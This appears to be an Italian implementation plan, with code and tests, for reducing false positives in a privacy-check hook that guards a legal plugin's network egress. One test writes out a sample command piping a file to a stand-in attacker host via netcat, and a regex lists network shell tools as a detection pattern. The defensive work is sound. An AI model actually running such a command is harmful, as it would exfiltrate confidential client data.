# Fix privacy-check: falsi positivi e attrito (v2.4.6) — Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Eliminare i falsi positivi dell'hook privacy su citazioni normative e lessico contrattuale, limitare di default la scansione alle uscite di rete, far funzionare la configurazione `userConfig` (che oggi è ignorata), aggiungere esenzioni per cartella e allineare documentazione e codice.

**Architecture:** L'hook `scripts/privacy-check.js` resta un unico script Node senza dipendenze. La logica cambia in tre punti indipendenti: (1) classificazione — nuovo gruppo `REFERENCE_PATTERNS` deboli e discriminator ristretto; (2) configurazione — risoluzione via env `CLAUDE_PLUGIN_OPTION_*` (spec ufficiale plugin: userConfig non arriva via stdin) più `.privacy-mode` che può solo alzare la severità; (3) perimetro — gating per tool (Write/Edit esclusi di default, Bash solo comandi di rete) ed esenzioni per percorso. Il server Ollama locale (`mcp-servers/ollama/src/privacy.ts`) duplica i pattern e viene allineato con rebuild del bundle.

**Tech Stack:** Node.js (CommonJS, zero dipendenze per l'hook), TypeScript + esbuild (server Ollama), test runner custom `node bettercallclaude_italia/scripts/privacy-check.test.js`.

## Global Constraints

- L'hook deve restare zero-dipendenze e sincrono; stdout solo JSON di decisione o niente; exit 0 su tutti i percorsi non errore.
- Il matcher in `bettercallclaude_italia/hooks/hooks.json` NON cambia (`Write|Edit|MultiEdit|WebFetch|Bash|mcp__.*`); il gating avviene nello script.
- Il file `.privacy-mode` può solo ALZARE la severità rispetto alla modalità base risolta (regola NEW-1 generalizzata); nessun file della cartella di lavoro può abbassare la protezione.
- Le esenzioni per cartella vivono solo in `userConfig` (`settings.json` utente), mai in file di progetto.
- Test: tutti i test esistenti che contraddicono il nuovo comportamento vengono aggiornati; le 6 stringhe di riproduzione del segnalante devono classificare `null`.
- Bump versione `bettercallclaude_italia/.claude-plugin/plugin.json` → `2.4.6` e voce CHANGELOG.
- I reason di decisione iniziano con il prefisso `[privacy-check] tool=... mode=... categoria=... match="..." — `.
- Lingua dei messaggi utente: italiano (come il codice esistente, senza accenti nei messaggi dell'hook).

---

### Task 1: Riclassificazione pattern e discriminator ristretto

**Files:**
- Modify: `bettercallclaude_italia/scripts/privacy-check.js` (blocco `STRONG_PATTERNS`, `WEAK_PATTERNS`, `DISCRIMINATOR_CONTENT`, `classify()`, `hasDiscriminator()`)
- Test: `bettercallclaude_italia/scripts/privacy-check.test.js`

**Interfaces:**
- Consumes: niente (primo task).
- Produces: `REFERENCE_PATTERNS` (nuovo array exportato), `classify(content, pathHint)` che restituisce `<cat>+context` per REFERENCE e WEAK solo con discriminator; `DISCRIMINATOR_CONTENT` ristretto; `hasDiscriminator(content, pathHint)` conta i match su `WEAK_PATTERNS.concat(REFERENCE_PATTERNS)` per la regola dei 2 segnali.

- [ ] **Step 1: Aggiorna i test esistenti e aggiungi le riproduzioni del segnalante**

In `bettercallclaude_italia/scripts/privacy-check.test.js`, sostituisci i test che oggi si aspettano le vecchie categorie forti. I test da modificare sono quelli con commento `classify: strong patterns` per: `segreto commerciale`, `Art. 622 CP` (3 varianti), `L. 247/2012`, `CDF Art. 13`, `CDF Art. 28`, `vincolo di riservatezza`, `obbligo di riservatezza`, `Art. 200 CPP`, `Art. 103 CPP`. Nuovo contenuto della sezione (le voci su `segreto professionale`, `segreto del mandato`, `strettamente riservato`, `riserbatissimo`, `segreto istruttorio`, `riservatezza professionale`, `comunicazione privilegiata`, i pattern inglesi restano invariati):

```js
// Reference patterns (v2.4.6) — norm citations and contract boilerplate are
// weak: they only count with a client/case discriminator.
t('detects segreto commerciale with discriminator', () => {
  assert.strictEqual(classify('Violazione del segreto commerciale a danno del cliente Rossi', ''), 'segreto-commerciale+context');
});

t('segreto commerciale without discriminator returns null', () => {
  assert.strictEqual(classify('Concorrenza sleale e violazione del segreto commerciale', ''), null);
});

t('detects Art. 622 CP with discriminator', () => {
  assert.strictEqual(classify('Violazione Art. 622 CP per il cliente Rossi', ''), 'art-622-cp+context');
});

t('art. 622 c.p. (Italian dotted form) without discriminator returns null', () => {
  assert.strictEqual(classify('Riferimento: art. 622 c.p.', ''), null);
});

t('Art 622 C.P. (variant) without discriminator returns null', () => {
  assert.strictEqual(classify('Violazione Art 622 C.P. in astratto', ''), null);
});

t('detects L. 247/2012 with discriminator', () => {
  assert.strictEqual(classify('Dovere di riservatezza L. 247/2012 nel mandante', ''), 'l-247-2012+context');
});

t('L. 247/2012 without discriminator returns null', () => {
  assert.strictEqual(classify('Riferimento: l. 247/2012.', ''), null);
});

t('detects CDF Art. 13 with discriminator', () => {
  assert.strictEqual(classify('Obbligo di segretezza CDF Art. 13 verso il cliente', ''), 'cdf-art-13+context');
});

t('detects CDF Art. 28 with discriminator', () => {
  assert.strictEqual(classify('Dovere di riserbo CDF Art. 28 verso il cliente', ''), 'cdf-art-28+context');
});

t('detects vincolo di riservatezza with discriminator', () => {
  assert.strictEqual(classify('Soggetto a vincolo di riservatezza verso il cliente', ''), 'vincolo-riservatezza+context');
});

t('vincolo di riservatezza without discriminator returns null', () => {
  assert.strictEqual(classify('Clausola: vincolo di riservatezza del fornitore', ''), null);
});

t('detects obbligo di riservatezza with discriminator', () => {
  assert.strictEqual(classify('Obbligo di riservatezza verso il cliente Rossi', ''), 'obbligo-riservatezza+context');
});

t('obbligo di riservatezza without discriminator returns null', () => {
  assert.strictEqual(classify('Clausola: obbligo di riservatezza del fornitore', ''), null);
});

t('detects Art. 200 CPP with discriminator', () => {
  assert.strictEqual(classify('Art. 200 CPP nel procedimento del cliente', ''), 'art-200-cpp+context');
});

t('Art. 200 CPP without discriminator returns null', () => {
  assert.strictEqual(classify('Il teste si avvale della facolta ex art. 200 c.p.p.', ''), null);
});

t('detects Art. 103 CPP with discriminator', () => {
  assert.strictEqual(classify('Art. 103 CPP a tutela del cliente', ''), 'art-103-cpp+context');
});

t('Art. 103 CPP without discriminator returns null', () => {
  assert.strictEqual(classify('Garanzie ex art. 103 c.p.p.', ''), null);
});

t('detects Art. 663 CP with discriminator', () => {
  assert.strictEqual(classify('Art. 663 CP nel fascicolo del cliente', ''), 'art-663-cp+context');
});
```

Nota: `classify('Art. 200 CPP nel procedimento del cliente', '')` — `cliente` e' nel discriminator ristretto, quindi +context. `procedimento` NON e' piu' discriminator da solo (verifica che NON ci sia un test che si affida a `procedimento` da solo: il test `'detects Art. 200 CPP with discriminator'` originale usava 'tutela del testimone' — sostituito sopra).

Aggiungi in fondo alla sezione `classify: weak patterns` le regressioni del segnalante:

```js
console.log('classify: reporter reproductions (v2.4.6)');

t('reporter: norm citation in legal text passes', () => {
  assert.strictEqual(classify('Riferimento: l. 247/2012.', '/x/f.md'), null);
});

t('reporter: contract boilerplate clause passes', () => {
  assert.strictEqual(classify('Clausola: obbligo di riservatezza del fornitore.', '/x/f.md'), null);
});

t('reporter: trade secret article headline passes', () => {
  assert.strictEqual(classify('Concorrenza sleale e violazione del segreto commerciale.', '/x/f.md'), null);
});

t('reporter: witness privilege citation passes', () => {
  assert.strictEqual(classify('Il teste si avvale della facolta ex art. 200 c.p.p.', '/x/f.md'), null);
});

t('reporter: riservato with generic legal vocabulary passes', () => {
  assert.strictEqual(classify('articolo ad accesso riservato; Per gli avvocati', '/x/f.md'), null);
});

t('reporter: privato with generic legal vocabulary passes', () => {
  assert.strictEqual(classify('Rapporti di diritto privato tra le parti; il giudice', '/x/f.md'), null);
});

t('generic legal vocabulary alone is not a discriminator', () => {
  assert.strictEqual(hasDiscriminator('parere dell avvocato presso il tribunale in opposizione al ricorso', ''), false);
});

t('client terms still discriminate', () => {
  assert.strictEqual(hasDiscriminator('controparte e parte avversa del cliente', ''), true);
});

t('two reference patterns count as two signals', () => {
  assert.strictEqual(classify('Riferimenti: l. 247/2012 e art. 622 c.p.', ''), 'l-247-2012+context');
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `node bettercallclaude_italia/scripts/privacy-check.test.js`
Expected: FAIL — i nuovi test su pattern deboli falliscono (i pattern sono ancora forti e il discriminator e' ancora ampio, quindi es. `'Riferimento: l. 247/2012.'` classifica ancora `l-247-2012` e `hasDiscriminator('parere dell avvocato...')` e' ancora true).

- [ ] **Step 3: Implementa la riclassificazione in privacy-check.js**

In `bettercallclaude_italia/scripts/privacy-check.js`:

1. Da `STRONG_PATTERNS` RIMUOVI queste 10 voci: `segreto-commerciale`, `vincolo-riservatezza`, `obbligo-riservatezza`, `art-622-cp`, `l-247-2012`, `cdf-art-13`, `cdf-art-28`, `art-663-cp`, `art-200-cpp`, `art-103-cpp` (commento incluso `// Legal article references -- Italian`).

2. Dopo `STRONG_PATTERNS`, aggiungi:

```js
// ---------------------------------------------------------------------------
// Reference patterns (weak) -- v2.4.6
// Norm citations and contract boilerplate appear routinely in acts, opinions
// and articles: citing the secrecy norm is not breaching secrecy. They only
// count together with a client/case discriminator, same weight as WEAK.
// ---------------------------------------------------------------------------

const REFERENCE_PATTERNS = [
  { rx: /\bsegreto\s+commerciale\b/i,                    cat: 'segreto-commerciale' },
  { rx: /\bvincolo\s+(?:di\s+)?riservatezza\b/i,         cat: 'vincolo-riservatezza' },
  { rx: /\bobbligo\s+di\s+riservatezza\b/i,              cat: 'obbligo-riservatezza' },
  { rx: /\bArt\.?\s*622\s*C\.?\s*P\.?\b/i,               cat: 'art-622-cp' },
  { rx: /\bL\.?\s*247[/]2012\b/i,                        cat: 'l-247-2012' },
  { rx: /\bCDF\s+Art\.?\s*13\b/i,                        cat: 'cdf-art-13' },
  { rx: /\bCDF\s+Art\.?\s*28\b/i,                        cat: 'cdf-art-28' },
  { rx: /\bArt\.?\s*663\s*C\.?\s*P\.?\b/i,               cat: 'art-663-cp' },
  { rx: /\bArt\.?\s*200\s*C\.?\s*P\.?\s*P\.?\b/i,        cat: 'art-200-cpp' },
  { rx: /\bArt\.?\s*103\s*C\.?\s*P\.?\s*P\.?\b/i,        cat: 'art-103-cpp' },
];
```

3. Sostituisci `DISCRIMINATOR_CONTENT` con la versione ristretta ai termini identificativi di cliente/causa:

```js
// v2.4.6: narrowed to client/case-identifying terms. Generic legal vocabulary
// (avvocato, giudice, tribunale, ricorso, ...) is present in virtually every
// legal text, so weak patterns fired everywhere.
const DISCRIMINATOR_CONTENT = new RegExp(
  '\\b(' +
  'cliente|clienti|client|mandante|mandanti' +
  '|dossier|numero\\s+di\\s+pratica|riferimento\\s+atto' +
  '|parte\\s+avversa|controparte' +
  ')\\b',
  'i'
);
```

4. In `classify()`, aggiungi il ciclo su REFERENCE_PATTERNS tra forti e deboli:

```js
function classify(content, pathHint) {
  for (const p of STRONG_PATTERNS) {
    if (p.rx.test(content)) return p.cat;
  }
  for (const p of REFERENCE_PATTERNS) {
    if (p.rx.test(content) && hasDiscriminator(content, pathHint)) {
      return p.cat + '+context';
    }
  }
  for (const p of WEAK_PATTERNS) {
    if (p.rx.test(content) && hasDiscriminator(content, pathHint)) {
      return p.cat + '+context';
    }
  }
  return null;
}
```

5. In `hasDiscriminator()`, la regola dei 2 segnali conta anche i reference:

```js
function hasDiscriminator(content, pathHint) {
  if (pathHint && DISCRIMINATOR_PATH.test(pathHint)) return true;
  if (DISCRIMINATOR_CONTENT.test(content)) return true;
  let weakHits = 0;
  for (const p of WEAK_PATTERNS) if (p.rx.test(content)) weakHits++;
  for (const p of REFERENCE_PATTERNS) if (p.rx.test(content)) weakHits++;
  return weakHits >= 2;
}
```

6. Nell'`module.exports` aggiungi `REFERENCE_PATTERNS`.

- [ ] **Step 4: Run test to verify it passes**

Run: `node bettercallclaude_italia/scripts/privacy-check.test.js`
Expected: PASS (le voci `decide`/`isStrongCategory` esistenti usano ancora pattern che restano forti o deboli+contesto validi; eventuali failure su test `decide` esistenti verranno sistemati al Task 3 — se falliscono qui, verificare che il test usi un pattern realmente forte come `segreto professionale`).

- [ ] **Step 5: Commit**

```bash
git add bettercallclaude_italia/scripts/privacy-check.js bettercallclaude_italia/scripts/privacy-check.test.js
git commit -m "fix(privacy): declassa citazioni normative e clausole boilerplate a pattern deboli, discriminator ristretto a termini cliente/causa"
```

---

### Task 2: Risoluzione configurazione via env + esenzioni per cartella

**Files:**
- Modify: `bettercallclaude_italia/scripts/privacy-check.js` (`resolveMode`, nuove funzioni di configurazione)
- Test: `bettercallclaude_italia/scripts/privacy-check.test.js`

**Interfaces:**
- Consumes: `MODE_SEVERITY`, `VALID_MODES`, `DEFAULT_MODE` da privacy-check.js.
- Produces (exportate e usate dal Task 3):
  - `resolveMode(data)` — priorità: env `CLAUDE_PLUGIN_OPTION_PRIVACY_MODE` > stdin `userConfig`/`user_config` > default `balanced`; poi `.privacy-mode` può solo alzare (`MODE_SEVERITY[file] > MODE_SEVERITY[base]`).
  - `resolveScanLocalWrites(data)` → `boolean` — env `CLAUDE_PLUGIN_OPTION_SCAN_LOCAL_WRITES` > stdin `scan_local_writes`; default `false`; valori truthy: `1|true|yes|on`.
  - `resolveExemptPaths(data)` → `string[]` — env `CLAUDE_PLUGIN_OPTION_PRIVACY_EXEMPT_PATHS` > stdin `privacy_exempt_paths`; separatore `;`; espansione `~` via `os.homedir()`; trailing separator rimosso.
  - `isExemptPath(p, exemptPaths)` → `boolean` — confronto per prefisso con boundary di separatore (`e`, `e + '/'`, `e + '\\'`).

- [ ] **Step 1: Aggiorna i test di resolveMode e aggiungi i test di configurazione**

In `privacy-check.test.js`:

a) Sostituisci il test `'userConfig takes priority over .privacy-mode file'` (le nuove regole: il file può solo alzare, anche sopra una scelta esplicita):

```js
t('explicit cloud base + .privacy-mode strict file -> strict (file can raise)', () => {
  const fs = require('fs');
  const path = require('path');
  const filePath = path.join(process.cwd(), '.privacy-mode');
  try {
    fs.writeFileSync(filePath, 'strict');
    assert.strictEqual(resolveMode({ userConfig: { privacy_mode: 'cloud' } }), 'strict');
  } finally {
    try { fs.unlinkSync(filePath); } catch (_) {}
  }
});
```

b) Aggiungi una nuova sezione in fondo (prima del blocco NEW-4 quoting):

```js
// ---------------------------------------------------------------------------
// v2.4.6: env-based configuration (CLAUDE_PLUGIN_OPTION_*)
// ---------------------------------------------------------------------------

console.log('resolveMode: env CLAUDE_PLUGIN_OPTION_PRIVACY_MODE');

t('env mode wins over default', () => {
  try {
    process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE = 'strict';
    assert.strictEqual(resolveMode({}), 'strict');
  } finally {
    delete process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE;
  }
});

t('env mode wins over stdin userConfig', () => {
  try {
    process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE = 'cloud';
    assert.strictEqual(resolveMode({ userConfig: { privacy_mode: 'strict' } }), 'cloud');
  } finally {
    delete process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE;
  }
});

t('env mode is normalized (case, whitespace)', () => {
  try {
    process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE = '  STRICT ';
    assert.strictEqual(resolveMode({}), 'strict');
  } finally {
    delete process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE;
  }
});

t('invalid env mode falls back to stdin then default', () => {
  try {
    process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE = 'bogus';
    assert.strictEqual(resolveMode({ userConfig: { privacy_mode: 'cloud' } }), 'cloud');
    assert.strictEqual(resolveMode({}), 'balanced');
  } finally {
    delete process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE;
  }
});

t('env strict + .privacy-mode cloud file stays strict (file cannot lower)', () => {
  const fs = require('fs');
  const path = require('path');
  const filePath = path.join(process.cwd(), '.privacy-mode');
  try {
    process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE = 'strict';
    fs.writeFileSync(filePath, 'cloud');
    assert.strictEqual(resolveMode({}), 'strict');
  } finally {
    delete process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_MODE;
    try { fs.unlinkSync(filePath); } catch (_) {}
  }
});

console.log('resolveScanLocalWrites / resolveExemptPaths / isExemptPath');

t('scan_local_writes defaults to false', () => {
  assert.strictEqual(resolveScanLocalWrites({}), false);
});

t('scan_local_writes reads env', () => {
  try {
    process.env.CLAUDE_PLUGIN_OPTION_SCAN_LOCAL_WRITES = 'true';
    assert.strictEqual(resolveScanLocalWrites({}), true);
  } finally {
    delete process.env.CLAUDE_PLUGIN_OPTION_SCAN_LOCAL_WRITES;
  }
});

t('scan_local_writes env accepts 1/yes/on, rejects garbage', () => {
  try {
    for (const v of ['1', 'yes', 'on', 'TRUE']) {
      process.env.CLAUDE_PLUGIN_OPTION_SCAN_LOCAL_WRITES = v;
      assert.strictEqual(resolveScanLocalWrites({}), true, v);
    }
    process.env.CLAUDE_PLUGIN_OPTION_SCAN_LOCAL_WRITES = 'banana';
    assert.strictEqual(resolveScanLocalWrites({}), false);
  } finally {
    delete process.env.CLAUDE_PLUGIN_OPTION_SCAN_LOCAL_WRITES;
  }
});

t('scan_local_writes falls back to stdin userConfig', () => {
  assert.strictEqual(resolveScanLocalWrites({ userConfig: { scan_local_writes: true } }), true);
  assert.strictEqual(resolveScanLocalWrites({ userConfig: { scan_local_writes: 'false' } }), false);
});

t('exempt paths default to empty', () => {
  assert.deepStrictEqual(resolveExemptPaths({}), []);
});

t('exempt paths split on semicolon, expand tilde, trim', () => {
  const os = require('os');
  const paths = resolveExemptPaths({ userConfig: { privacy_exempt_paths: ' ~/docs/blog ; /tmp/x/ ' } });
  assert.deepStrictEqual(paths, [os.homedir() + '/docs/blog', '/tmp/x']);
});

t('exempt paths read from env', () => {
  try {
    process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_EXEMPT_PATHS = '/var/editoriale';
    assert.deepStrictEqual(resolveExemptPaths({}), ['/var/editoriale']);
  } finally {
    delete process.env.CLAUDE_PLUGIN_OPTION_PRIVACY_EXEMPT_PATHS;
  }
});

t('isExemptPath matches exact, child dirs, both separators', () => {
  const exempt = ['/tmp/blog'];
  assert.strictEqual(isExemptPath('/tmp/blog', exempt), true);
  assert.strictEqual(isExemptPath('/tmp/blog/post.md', exempt), true);
  assert.strictEqual(isExemptPath('/tmp/blog/sub/dir', exempt), true);
  assert.strictEqual(isExemptPath('/tmp/blogger/post.md', exempt), false);
  assert.strictEqual(isExemptPath('', exempt), false);
  assert.strictEqual(isExemptPath('/tmp/blog', []), false);
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `node bettercallclaude_italia/scripts/privacy-check.test.js`
Expected: FAIL — `resolveScanLocalWrites`, `resolveExemptPaths`, `isExemptPath` non definite; i nuovi test env falliscono.

- [ ] **Step 3: Implementa la configurazione in privacy-check.js**

In `bettercallclaude_italia/scripts/privacy-check.js`:

1. Sostituisci `resolveMode()` con:

```js
function resolveMode(data) {
  const cfg = data.userConfig || data.user_config || {};
  let base = DEFAULT_MODE;

  // v2.4.6: plugin userConfig reaches hooks as CLAUDE_PLUGIN_OPTION_<KEY>
  // env vars (per the official plugin spec); stdin userConfig is kept as a
  // fallback for hosts that pass it. Priority: env > stdin > default.
  const fromEnv = (envOption('PRIVACY_MODE') || '').toLowerCase().trim();
  const fromConfig = (typeof cfg.privacy_mode === 'string' ? cfg.privacy_mode : '').toLowerCase().trim();
  for (const candidate of [fromEnv, fromConfig]) {
    if (VALID_MODES.includes(candidate)) { base = candidate; break; }
  }

  // NEW-1 generalized: the .privacy-mode file can only RAISE severity above
  // the resolved base mode. A deposited file can never lower protection.
  try {
    const fs = require('fs');
    const path = require('path');
    const filePath = path.join(data.cwd || process.cwd(), '.privacy-mode');
    const fromFile = fs.readFileSync(filePath, 'utf8').trim().toLowerCase();
    if (VALID_MODES.includes(fromFile) && MODE_SEVERITY[fromFile] > MODE_SEVERITY[base]) {
      return fromFile;
    }
  } catch (_) { /* file not found or unreadable — use base */ }

  return base;
}
```

2. Aggiungi dopo `resolveMode()`:

```js
// ---------------------------------------------------------------------------
// v2.4.6: configuration helpers (env-first, per official plugin spec)
// ---------------------------------------------------------------------------

function envOption(name) {
  const v = process.env['CLAUDE_PLUGIN_OPTION_' + name];
  return typeof v === 'string' ? v : undefined;
}

function resolveScanLocalWrites(data) {
  const cfg = data.userConfig || data.user_config || {};
  let raw = envOption('SCAN_LOCAL_WRITES');
  if (raw === undefined && cfg.scan_local_writes !== undefined && cfg.scan_local_writes !== null) {
    raw = String(cfg.scan_local_writes);
  }
  if (raw === undefined || String(raw).trim() === '') return false;
  return ['1', 'true', 'yes', 'on'].includes(String(raw).trim().toLowerCase());
}

function resolveExemptPaths(data) {
  const cfg = data.userConfig || data.user_config || {};
  let raw = envOption('PRIVACY_EXEMPT_PATHS');
  if (raw === undefined && typeof cfg.privacy_exempt_paths === 'string') {
    raw = cfg.privacy_exempt_paths;
  }
  const os = require('os');
  const home = os.homedir();
  return String(raw || '')
    .split(';')
    .map((p) => p.trim())
    .filter(Boolean)
    .map((p) => (p === '~' || p.startsWith('~/') || p.startsWith('~\\') ? home + p.slice(1) : p))
    .map((p) => p.replace(/[\\/]+$/, ''));
}

function isExemptPath(p, exemptPaths) {
  if (!p || !exemptPaths || !exemptPaths.length) return false;
  const norm = String(p).replace(/[\\/]+$/, '');
  return exemptPaths.some((e) => norm === e || norm.startsWith(e + '/') || norm.startsWith(e + '\\'));
}
```

3. Nell'`module.exports` aggiungi `resolveScanLocalWrites`, `resolveExemptPaths`, `isExemptPath`, `envOption`.

- [ ] **Step 4: Run test to verify it passes**

Run: `node bettercallclaude_italia/scripts/privacy-check.test.js`
Expected: PASS (tutti i test, inclusi quelli ancora verdi del Task 1).

- [ ] **Step 5: Commit**

```bash
git add bettercallclaude_italia/scripts/privacy-check.js bettercallclaude_italia/scripts/privacy-check.test.js
git commit -m "fix(privacy): risolvi modalita ed opzioni via CLAUDE_PLUGIN_OPTION_* env, .privacy-mode puo solo alzare la severita, esenzioni per cartella"
```

---

### Task 3: Perimetro di scansione per tool + reason diagnostici

**Files:**
- Modify: `bettercallclaude_italia/scripts/privacy-check.js` (`main`, `decide`, nuove `isLocalWriteTool`, `NETWORK_COMMANDS`)
- Test: `bettercallclaude_italia/scripts/privacy-check.test.js`

**Interfaces:**
- Consumes: `resolveScanLocalWrites`, `resolveExemptPaths`, `isExemptPath` dal Task 2.
- Produces:
  - `isLocalWriteTool(toolName)` → `boolean` — true per `Write|Edit|MultiEdit`.
  - `NETWORK_COMMANDS` — RegExp: word boundary su `curl|wget|nc|ncat|netcat|ssh|scp|sftp|ftp|rsync` oppure `git push` (case-insensitive).
  - `decide(content, pathHint, mode, bashPaths, opts)` — come prima; `opts.toolName` aggiunge il prefisso diagnostico ai reason. Return invariato (`null | {decision, reason}`).
  - `diagnosticPrefix(toolName, mode, category, content)` → stringa `[privacy-check] tool=... mode=... categoria=... match="..." — ` (match solo se trovato).

- [ ] **Step 1: Aggiungi i test di gating e del prefisso diagnostico**

Aggiungi in `privacy-check.test.js` (dopo le sezioni esistenti, prima di NEW-4):

```js
// ---------------------------------------------------------------------------
// v2.4.6: tool gating and diagnostic reasons
// ---------------------------------------------------------------------------

console.log('isLocalWriteTool / NETWORK_COMMANDS');

t('Write/Edit/MultiEdit are local write tools', () => {
  assert.strictEqual(isLocalWriteTool('Write'), true);
  assert.strictEqual(isLocalWriteTool('Edit'), true);
  assert.strictEqual(isLocalWriteTool('MultiEdit'), true);
  assert.strictEqual(isLocalWriteTool('WebFetch'), false);
  assert.strictEqual(isLocalWriteTool('Bash'), false);
});

t('network commands detected', () => {
  assert.strictEqual(NETWORK_COMMANDS.test('curl https://example.com'), true);
  assert.strictEqual(NETWORK_COMMANDS.test('cat f | nc evil.com 4444'), true);
  assert.strictEqual(NETWORK_COMMANDS.test('git push origin main'), true);
  assert.strictEqual(NETWORK_COMMANDS.test('wget -qO- http://x'), true);
});

t('local commands not flagged as network', () => {
  assert.strictEqual(NETWORK_COMMANDS.test('cat /fascicoli/Rossi/doc.txt'), false);
  assert.strictEqual(NETWORK_COMMANDS.test('ls -la && grep -r foo .'), false);
  assert.strictEqual(NETWORK_COMMANDS.test('git commit -m x'), false);
});

console.log('decide: diagnostic prefix');

t('reason starts with [privacy-check] tool/mode/categoria', () => {
  const r = decide('Questo e segreto professionale', '', 'balanced', [], { toolName: 'WebFetch' });
  assert.ok(r.reason.startsWith('[privacy-check] tool=WebFetch mode=balanced categoria=segreto-professionale'));
  assert.ok(r.reason.includes('match="segreto professionale"'));
  assert.ok(r.reason.includes('Confermare'));
});

t('prefix includes bash path category when no content match', () => {
  const r = decide('curl something', '', 'balanced', ['/fascicoli/Rossi/doc.pdf'], { toolName: 'Bash' });
  assert.ok(r.reason.startsWith('[privacy-check] tool=Bash mode=balanced'));
  assert.ok(r.reason.includes('directory privilegiata'));
});

// ---------------------------------------------------------------------------
// v2.4.6: shouldScanTool — per-tool scan gating
// ---------------------------------------------------------------------------

console.log('shouldScanTool');

t('local writes skipped by default', () => {
  assert.strictEqual(shouldScanTool('Write', {}, false), false);
  assert.strictEqual(shouldScanTool('Edit', {}, false), false);
  assert.strictEqual(shouldScanTool('MultiEdit', {}, false), false);
});

t('local writes scanned when scan_local_writes on', () => {
  assert.strictEqual(shouldScanTool('Write', {}, true), true);
});

t('WebFetch and MCP always scanned', () => {
  assert.strictEqual(shouldScanTool('WebFetch', {}, false), true);
  assert.strictEqual(shouldScanTool('mcp__cassazione__search', {}, false), true);
});

t('ollama MCP always local (never scanned)', () => {
  assert.strictEqual(shouldScanTool('mcp__ollama__generate', {}, true), false);
});

t('Bash scanned only with network command by default', () => {
  assert.strictEqual(shouldScanTool('Bash', { command: 'curl https://x' }, false), true);
  assert.strictEqual(shouldScanTool('Bash', { command: 'ls -la' }, false), false);
  assert.strictEqual(shouldScanTool('Bash', { command: 'ls -la' }, true), true);
});

t('Bash scanned by default when referencing files in privileged paths', () => {
  assert.strictEqual(shouldScanTool('Bash', { command: 'cat /fascicoli/Rossi/doc.txt' }, false), true);
  assert.strictEqual(shouldScanTool('Bash', { command: 'head -5 /tmp/notes.txt' }, false), false);
});
```

- [ ] **Step 2: Run test to verify it fails**

Run: `node bettercallclaude_italia/scripts/privacy-check.test.js`
Expected: FAIL — `isLocalWriteTool`, `NETWORK_COMMANDS`, `shouldScanTool` non definite.

- [ ] **Step 3: Implementa gating e reason in privacy-check.js**

1. Dopo `isLocalTool()`, aggiungi:

```js
// ---------------------------------------------------------------------------
// v2.4.6: scan perimeter
// ---------------------------------------------------------------------------

function isLocalWriteTool(toolName) {
  return /^(Write|Edit|MultiEdit)$/.test(toolName);
}

// Bash commands able to send data off the machine. `git push` is matched as
// a compound form. Everything else (cat, grep, sed, redirects to local files)
// does not exfiltrate and is skipped unless scan_local_writes is on.
const NETWORK_COMMANDS = /\b(?:curl|wget|nc|ncat|netcat|ssh|scp|sftp|ftp|rsync)\b|\bgit\s+push\b/i;

/**
 * Decide whether a tool call enters content scanning at all.
 * Default perimeter is network egress only: WebFetch, non-local MCP tools and
 * network-capable Bash commands are scanned; local writes are not, because
 * writing a local file never transmits data (the model already holds the
 * content). NEW-2 path analysis stays active for every Bash command.
 * Returns false also for local MCP tools (Ollama) in every configuration.
 */
function shouldScanTool(toolName, toolInput, scanLocalWrites) {
  if (isLocalTool(toolName)) return false;
  if (isLocalWriteTool(toolName)) return !!scanLocalWrites;
  if (toolName === 'Bash' || toolName === 'bash') {
    const cmd = (toolInput && typeof toolInput.command === 'string') ? toolInput.command : '';
    if (scanLocalWrites) return true;
    if (NETWORK_COMMANDS.test(cmd)) return true;
    return extractBashFilePaths(cmd).length > 0;
  }
  return true;
}
```

2. Aggiungi il prefisso diagnostico prima di `decide()`:

```js
function diagnosticPrefix(toolName, mode, category, content) {
  let match = '';
  const all = STRONG_PATTERNS.concat(REFERENCE_PATTERNS, WEAK_PATTERNS);
  for (const p of all) {
    const m = p.rx.exec(content || '');
    if (m) { match = m[0]; break; }
  }
  return '[privacy-check] tool=' + (toolName || '?') +
    ' mode=' + mode +
    ' categoria=' + category +
    (match ? ' match="' + match + '"' : '') + ' — ';
}
```

3. Cambia la firma di `decide()` in `decide(content, pathHint, mode, bashPaths, opts)` e prependi il prefisso ai reason. Il corpo resta identico salvo l'aggiunta di `const prefix = diagnosticPrefix((opts && opts.toolName) || '', mode, categoryForPrefix, content);` dove:
   - per il ramo strict con `bashPathHit && !category`, `categoryForPrefix` = `'bash-privileged-path'`;
   - altrove `categoryForPrefix` = `category` (che in quel punto e' valorizzato).
   Le tre stringhe reason esistenti diventano `prefix + 'BLOCCATO: ...'`, `prefix + 'Comando shell referenzia ...'`, ecc. — stesso testo dopo il prefisso, invariato.

4. In `main()`, dopo `const mode = resolveMode(data);` aggiungi:

```js
    const scanLocal = resolveScanLocalWrites(data);
    const exemptPaths = resolveExemptPaths(data);

    // v2.4.6: user-configured exempt folders skip the check entirely.
    const earlyPath = extractPathHint(toolInput);
    if (isExemptPath(earlyPath, exemptPaths) || isExemptPath(data.cwd || '', exemptPaths)) {
      process.exit(0);
    }

    if (!shouldScanTool(toolName, toolInput, scanLocal)) { process.exit(0); }
```

   e passa il tool name a decide: `const result = decide(content, pathHint, mode, bashPaths, { toolName });`.

   Nota: la riga esistente `if (isLocalTool(toolName)) { process.exit(0); }` in main() viene RIMOSSA perche' `shouldScanTool` la copre.

- [ ] **Step 4: Run test to verify it passes**

Run: `node bettercallclaude_italia/scripts/privacy-check.test.js`
Expected: PASS completo (tutte le sezioni).

- [ ] **Step 5: Smoke test end-to-end dello script**

Run:
```bash
echo '{"tool_name":"Write","tool_input":{"file_path":"/x/f.md","content":"Riferimento: l. 247/2012 e obbligo di riservatezza del fornitore."},"cwd":"/tmp"}' | node bettercallclaude_italia/scripts/privacy-check.js
